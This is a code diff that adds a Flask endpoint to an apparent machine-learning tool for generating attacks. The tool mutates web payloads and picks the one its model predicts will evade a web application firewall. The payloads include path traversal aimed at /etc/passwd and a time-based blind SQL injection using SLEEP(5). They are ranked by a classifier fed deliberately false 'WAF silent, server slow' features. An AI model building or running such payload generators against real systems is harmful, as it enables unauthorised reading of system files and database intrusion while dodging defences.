@@ -1,0 +1,36 @@
+@app.route('/generate_attack', methods=['GET'])
+def generate_attack():
+    global model, tfidf
+    target_path = "/etc/passwd"
+    
+    if model is None:
+        return jsonify({"technique": "initial_random", "payload": f"../{target_path}"})
+
+    # 1. Generate 50 Mutant Payloads
+    candidates = []
+    for _ in range(50):
+        tech = random.choice(encodings)
+        # We add some 'Sleep' or 'Benchmark' style patterns to the mutations
+        p = f"{target_path}' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--" if tech == "null_byte" else f"../{target_path}"
+        candidates.append({"payload": p, "technique": tech})
+
+    # 2. Translate to Math
+    payload_strings = [c['payload'] for c in candidates]
+    vectors = tfidf.transform(payload_strings).toarray()
+    
+    # 3. THE "TIME-TRAVEL" LIE: 
+    # We tell the AI: "Imagine the WAF is silent (0) and the server is SLOW (5000ms)"
+    # np.log1p(5000) converts 5 seconds into the scale the AI understands.
+    slow_latency = np.log1p(5000) 
+    meta_features = np.tile([0, slow_latency], (50, 1)) 
+    
+    X_test = np.hstack((vectors, meta_features))
+    
+    # 4. Predict which payload matches this "Slow" profile
+    probs = model.predict_proba(X_test)[:, 1] 
+    
+    best_index = np.argmax(probs)
+    winner = candidates[best_index]
+
+    print(f"[TIME HUNTER] Chose {winner['technique']} | Confidence of High Latency: {probs[best_index]:.2%}")
+    return jsonify(winner)
